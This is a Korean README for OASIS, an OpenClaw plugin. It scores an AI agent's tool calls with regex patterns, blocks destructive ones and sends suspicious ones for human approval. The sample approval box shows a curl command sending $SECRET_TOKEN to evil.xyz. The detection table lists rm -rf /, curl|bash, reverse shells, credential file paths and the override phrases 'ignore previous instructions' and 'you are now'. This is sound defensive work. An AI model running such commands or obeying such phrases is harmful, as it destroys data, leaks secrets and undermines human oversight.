<p align="center">
  <img src="https://img.shields.io/badge/OpenClaw-Plugin-blueviolet?style=for-the-badge" alt="OpenClaw Plugin" />
  <img src="https://img.shields.io/badge/version-1.0.0-blue?style=for-the-badge" alt="Version" />
  <img src="https://img.shields.io/npm/v/@petercha90/oasis?style=for-the-badge&color=red" alt="npm" />
  <img src="https://img.shields.io/github/license/PeterCha90/oasis?style=for-the-badge" alt="License" />
</p>

<h1 align="center">🏝️ OASIS</h1>
<h3 align="center">OpenClaw Antidote for Suspicious Injection Signals</h3>

<p align="center">
  모든 tool 호출을 가로채서 deterministic 패턴 매칭으로 위험도를 점수화하고,<br/>
  위험한 패턴은 자동 차단, 의심스러운 패턴은<br/>
  <b>Slack/Discord/Telegram 네이티브 버튼으로 승인을 요청하는</b> OpenClaw 플러그인.
</p>

<p align="center">
  LLM 판단 없음. 오판 없음. 오직 정규식과 수학.
</p>

---

```
┌─────────────────────────────────────────┐
│ 🏝️ OASIS Security Review               │
│                                         │
│ Risk Score: 0.8 / 1.0                   │
│ Tool: exec                              │
│ Detected: Suspicious domain (.xyz),     │
│           Secret/credential access      │
│                                         │
│ Parameters:                             │
│ { "command": "curl https://evil.xyz/    │
│    steal?data=$SECRET_TOKEN" }          │
│                                         │
│  ┌──────────┐  ┌──────────┐            │
│  │ ✅ Allow  │  │ ❌ Deny  │            │
│  └──────────┘  └──────────┘            │
└─────────────────────────────────────────┘
```

---

**[🇺🇸 English](../README.md)**

---

## 동작 원리

OASIS는 OpenClaw Gateway의 `before_tool_call` 파이프라인에 hook으로 동작한다. 모든 tool 호출이 3단계 판정을 거친다:

```
Agent가 tool 호출 요청
        │
        ▼
  ┌─────────────────┐
  │ before_tool_call │ ◄── OASIS hook
  └────────┬────────┘
           │
     Read tool? ─── Yes ──→ 자유 통과 ✅
           │
          No
           │
     패턴 스캔 ──→ score 0.0 ~ 1.0
           │
     ┌─────┴──────┐
   = 1.0        > threshold        ≤ threshold
     │              │                    │
  🚨 차단       ⚠️ 승인 요청        ✅ 자동 허용
  (해제 불가)    (Slack/Discord/
                  Telegram 버튼)
```

---

## 요구사항

| 항목 | 최소 버전 |
|------|-----------|
| OpenClaw Gateway | `>= 2026.3.28` |
| Node.js | `>= 22.14` |

---

## 설치

### 1. 플러그인

```bash
openclaw plugins install @petercha90/oasis
openclaw gateway restart
```

### 2. OASIS Slack 앱 (선택 — 승인 UI)

> Slack 앱 없이도 OASIS는 작동합니다 — OpenClaw 기본 텍스트 승인(`/approve` 명령)을 사용합니다. Slack 앱을 추가하면 이모지 리액션으로 더 편하게 승인/거부할 수 있습니다.

전용 Slack 앱을 생성합니다:

#### Step 1: 앱 생성

1. [api.slack.com/apps](https://api.slack.com/apps) 접속
2. **Create New App** → **From scratch**
3. App Name: `OASIS`
4. 워크스페이스 선택 → **Create App**

#### Step 2: Socket Mode 활성화

1. 좌측 메뉴 → **Socket Mode**
2. **Enable Socket Mode** 토글 ON
3. App-Level Token 생성 팝업:
   - Token Name: `oasis`
   - Scope: `connections:write` (자동 선택)
   - **Generate** 클릭
4. `xapp-...`로 시작하는 토큰 복사 — 이것이 **App Token**

#### Step 3: 봇 권한 설정

1. 좌측 메뉴 → **OAuth & Permissions**
2. **Scopes** → **Bot Token Scopes** 에서 아래 5개 추가:

| Scope | 용도 |
|-------|------|
| `chat:write` | 승인 요약 및 결과 메시지 게시 |
| `reactions:read` | 사용자의 ✅ 🙅 리액션 감지 |
| `reactions:write` | 승인 메시지에 ✅ 🙅 리액션 힌트 추가 |
| `channels:history` | 승인 메시지에서 approval ID 추출 |
| `channels:read` | 채널 정보 접근 |

#### Step 4: 이벤트 구독

1. 좌측 메뉴 → **Event Subscriptions**
2. **Enable Events** 토글 ON
3. **Subscribe to bot events** → **Add Bot User Event** 에서 2개 추가:

| Event | 용도 |
|-------|------|
| `message.channels` | OpenClaw 에이전트의 승인 메시지 감지 |
| `reaction_added` | 사용자의 Allow(✅) / Deny(🙅) 리액션 감지 |

4. **Save Changes** 클릭

#### Step 5: 워크스페이스에 설치

1. 좌측 메뉴 → **Install App**
2. **Install to Workspace** → **Allow**
3. `xoxb-...`로 시작하는 **Bot User OAuth Token** 복사 — 이것이 **Bot Token**

### 3. OASIS 설정

OpenClaw 플러그인 config에 두 토큰을 추가합니다:

```jsonc
// ~/.openclaw/openclaw.json
{
  "plugins": {
    "entries": {
      "oasis": {
        "enabled": true,
        "config": {
          "threshold": 0.3,
          "approvalTimeoutMs": 120000,
          "oasisBotToken": "xoxb-여기에-봇-토큰",
          "oasisAppToken": "xapp-여기에-앱-토큰"
        }
      }
    }
  },
  "approvals": {
    "plugin": {
      "enabled": true
    }
  }
}
```

### 4. OASIS 봇 채널 초대

```
/invite @OASIS
```

Gateway 재시작하면 OASIS가 자동 연결됩니다:

```bash
openclaw gateway restart
```

> 승인이 필요한 tool 호출 시 OASIS가 ✅ 🙅 리액션을 추가합니다. ✅ = 허용, 🙅 = 거부.

---

## 도구 분류

| 분류 | 도구 | 동작 |
|------|------|------|
| **Read** (자유 통과) | `read`, `glob`, `grep`, `web_search`, `list`, `cat` | 분석 없이 통과 |
| **Execute** (위험 분석) | `exec`, `bash`, `write`, `edit`, `web_fetch`, `file_delete`, `apply_patch` | 패턴 매칭 수행 |

커스텀 도구 추가 가능:

```jsonc
{
  "config": {
    "customReadTools": ["my_safe_tool"],
    "customExecuteTools": ["my_dangerous_tool"]
  }
}
```

---

## 위험도 판단

모든 스코어링은 **deterministic 패턴 매칭**이다. LLM 판단에 의존하지 않는다.

| ID | 탐지 패턴 | 점수 | 동작 |
|----|-----------|------|------|
| `BLOCK_DESTRUCTIVE` | `rm -rf /`, fork bomb, `mkfs`, `dd if=/dev/zero` | **1.0** | 🚨 차단 |
| `BLOCK_PIPE_SHELL` | `curl \| bash`, `wget \| sh` | **1.0** | 🚨 차단 |
| `PROMPT_INJECTION` | `ignore previous instructions`, `you are now` | 0.9 | 승인 요청 |
| `SECRET_ACCESS` | `$AWS_SECRET`, `process.env.TOKEN` | 0.8 | 승인 요청 |
| `SUSPICIOUS_DOMAIN` | `.xyz`, `.tk`, `.ml`, `.pw`, `.top` | 0.8 | 승인 요청 |
| `DATA_EXFILTRATION` | `curl -X POST`, `nc -e`, reverse shell | 0.7 | 승인 요청 |
| `SENSITIVE_FILE` | `.env`, `.ssh/id_rsa`, `.aws/credentials` | 0.6 | 승인 요청 |
| `PRIVILEGE_ESCALATION` | `sudo`, `chmod 777`, `chown root` | 0.5 | 승인 요청 |
| `EXTERNAL_URL` | 안전 도메인 외 HTTP 접근 | 0.3 | 승인 요청 |

- **Score 1.0** = 무조건 차단, 승인 불가
- **Score > threshold** = 사용자 승인 필요 (Slack/Discord/Telegram 버튼)
- **Score ≤ threshold** = 자동 허용
- 복수 패턴 매칭 시 `max()` 전략 사용

---

## 설정 옵션

| 옵션 | 타입 | 기본값 | 설명 |
|------|------|--------|------|
| `threshold` | `number` | `0.3` | 위험도 임계값 (0.0 가장 엄격 ~ 0.9 가장 관대) |
| `approvalTimeoutMs` | `number` | `120000` | 승인 대기 시간 (타임아웃 시 자동 거부) |
| `safeDomains` | `string[]` | `[]` | 추가 안전 도메인 (EXTERNAL_URL 스킵) |
| `customPatterns` | `object[]` | `[]` | 커스텀 탐지 패턴 (`{id, regex, score}`) |
| `customReadTools` | `string[]` | `[]` | 추가 읽기 전용 도구 |
| `customExecuteTools` | `string[]` | `[]` | 추가 실행 도구 |
| `logLevel` | `string` | `"info"` | `debug`, `info`, `warn`, `error` |

### 기본 안전 도메인

`github.com`, `npmjs.com`, `pypi.org`, `crates.io`, `api.anthropic.com`, `api.openai.com`, `docs.openclaw.ai`, `stackoverflow.com` 등.

---

## CLI

```bash
# 명령어 위험도 사전 테스트
openclaw oasis test "rm -rf /"
# 🚨 BLOCKED (1.0) — Destructive command

openclaw oasis test "curl https://api.github.com/repos"
# ✅ AUTO-ALLOW (0.0)

openclaw oasis test "sudo docker-compose up"
# ⚠️ APPROVAL REQUIRED (0.5) — Privilege escalation

# 현재 설정 확인
openclaw oasis status
```

---

## 삭제

```bash
openclaw plugins uninstall oasis
openclaw gateway restart
```

---

## 프로젝트 구조

```
oasis/
├── src/
│   ├── index.ts              # 플러그인 진입점 (definePluginEntry)
│   ├── scanner.ts            # 위험도 스코어링 엔진
│   ├── classifier.ts         # 도구 분류기
│   ├── patterns.ts           # 탐지 패턴 정의
│   ├── config.ts             # 설정 로딩
│   ├── logger.ts             # 구조화 로깅
│   ├── types.ts              # TypeScript 타입
│   ├── cli/
│   │   └── setup-wizard.ts   # 플러그인 CLI 명령어
│   └── slack/
│       ├── approval-handler.ts # 전용 OASIS Slack 앱 (Socket Mode)
│       ├── approval-parser.ts  # 승인 메시지 파서
│       └── gateway-client.ts   # Gateway WebSocket 클라이언트
├── tests/                    # 68개 테스트 (5개 스위트)
├── openclaw.plugin.json      # 플러그인 매니페스트
├── package.json
└── tsconfig.json
```

---

## 왜 "OASIS"인가?

**O**penClaw **A**ntidote for **S**uspicious **I**njection **S**ignals

사막 한가운데 오아시스처럼, 보안 위협 속 안전지대. 🏝️

---

## 라이선스

MIT — [Peter Cha](https://github.com/PeterCha90)
